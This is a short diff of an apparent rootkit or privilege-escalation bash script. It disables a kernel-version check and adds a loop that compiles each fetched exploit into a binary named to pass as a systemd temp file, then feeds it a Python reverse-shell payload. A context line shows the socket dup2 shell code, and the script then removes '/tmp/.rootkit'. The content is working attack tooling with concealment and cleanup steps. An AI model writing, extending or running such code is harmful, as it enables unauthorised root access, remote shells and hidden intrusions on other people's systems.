@@ -73,6 +73,7 @@ os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess
 EOF
 )
   exploits_major_array=($(ls /tmp/$ip:$portp/exploits))
+  : '
   for i in ${exploits_major_array[*]}; do
     if [ $major -le $i ]; then
       exploits_minor_array=($(ls /tmp/$ip:$portp/exploits/$i))
@@ -88,6 +89,13 @@ EOF
         fi
       done
     fi
+  done
+  '
+  for i in ${exploits_major_array[*]}; do
+    gcc -pthread -o /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx /tmp/$ip:$portp/exploits/$i &>/dev/null
+    echo "attempting $i..."
+    echo $python_reverse | /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx &>/dev/null
+    sleep 3
   done
   printf "removing files needed by payload... "
   rm /tmp/.rootkit &>/dev/null
